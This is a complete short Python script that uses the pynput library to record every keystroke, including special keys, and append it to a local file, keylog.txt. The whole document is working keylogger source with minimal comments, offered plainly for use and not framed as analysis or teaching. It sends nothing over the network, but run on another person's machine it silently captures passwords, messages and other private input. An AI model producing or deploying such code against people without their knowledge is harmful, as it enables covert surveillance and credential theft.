import pynput.keyboard

# Define a function to write the keylogs to a file
def write_to_file(key):
    with open("keylog.txt", "a") as file:
        file.write(str(key))

# Define a function to handle keypress events
def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        # Special keys (e.g., shift, ctrl, etc.) don't have a char attribute
        write_to_file("[" + str(key) + "]")

# Define a function to handle key release events 
def on_release(key):
    pass

# Start listening for keypress and key release events
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()